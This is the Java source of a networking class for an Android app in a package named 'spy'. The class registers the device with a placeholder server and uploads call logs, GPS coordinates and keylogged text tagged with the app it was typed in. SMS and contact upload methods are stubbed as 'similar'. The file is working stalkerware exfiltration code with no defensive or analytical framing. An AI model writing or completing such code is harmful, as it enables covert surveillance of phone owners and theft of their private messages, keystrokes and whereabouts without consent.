package com.gauravhanna.spy;

import android.content.Context;
import android.content.SharedPreferences;
import android.location.Location;
import com.google.gson.Gson;
import okhttp3.*;
import java.io.IOException;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class NetworkHelper {
    private static final String BASE_URL = "http://your-server-ip:5000/api/client";
    private static final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();
    private static Gson gson = new Gson();

    // Device ID stored in SharedPreferences
    private static String getDeviceId(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE);
        return prefs.getString("device_id", null);
    }

    private static void setDeviceId(Context context, String id) {
        SharedPreferences prefs = context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE);
        prefs.edit().putString("device_id", id).apply();
    }

    // Register device (call once)
    public static void registerDevice(Context context, String deviceId, String deviceName, String model, String androidVersion, String userId) {
        RequestBody body = RequestBody.create(MediaType.parse("application/json"),
                "{\"deviceId\":\"" + deviceId + "\",\"deviceName\":\"" + deviceName + "\",\"deviceModel\":\"" + model + "\",\"androidVersion\":\"" + androidVersion + "\",\"userId\":\"" + userId + "\"}");
        Request request = new Request.Builder()
                .url(BASE_URL + "/register")
                .post(body)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    // Parse response to get server device id
                    // For simplicity, we assume deviceId is same
                }
            }
        });
    }

    // Send calls
    public static void sendCalls(Context context, List<DataCollector.CallLogEntry> calls) {
        String deviceId = getDeviceId(context);
        if (deviceId == null) return;
        String json = gson.toJson(calls);
        RequestBody body = RequestBody.create(MediaType.parse("application/json"),
                "{\"deviceId\":\"" + deviceId + "\",\"calls\":" + json + "}");
        Request request = new Request.Builder()
                .url(BASE_URL + "/calls")
                .post(body)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                response.close();
            }
        });
    }

    // Send SMS
    public static void sendSMS(Context context, List<DataCollector.SmsEntry> smsList) {
        // similar
    }

    // Send contacts
    public static void sendContacts(Context context, List<DataCollector.ContactEntry> contacts) {
        // similar
    }

    // Send location
    public static void sendLocation(Context context, Location location) {
        String deviceId = getDeviceId(context);
        if (deviceId == null) return;
        String json = "{\"deviceId\":\"" + deviceId + "\",\"lat\":" + location.getLatitude() + ",\"lng\":" + location.getLongitude() + ",\"speed\":" + location.getSpeed() + "}";
        RequestBody body = RequestBody.create(MediaType.parse("application/json"), json);
        Request request = new Request.Builder()
                .url(BASE_URL + "/location")
                .post(body)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                response.close();
            }
        });
    }

    // Send keylog
    public static void sendKeylog(Context context, String appPackage, String text) {
        String deviceId = getDeviceId(context);
        if (deviceId == null) return;
        String json = "{\"deviceId\":\"" + deviceId + "\",\"appPackage\":\"" + appPackage + "\",\"text\":\"" + text.replace("\"", "\\\"") + "\"}";
        RequestBody body = RequestBody.create(MediaType.parse("application/json"), json);
        Request request = new Request.Builder()
                .url(BASE_URL + "/keylog")
                .post(body)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                response.close();
            }
        });
    }
}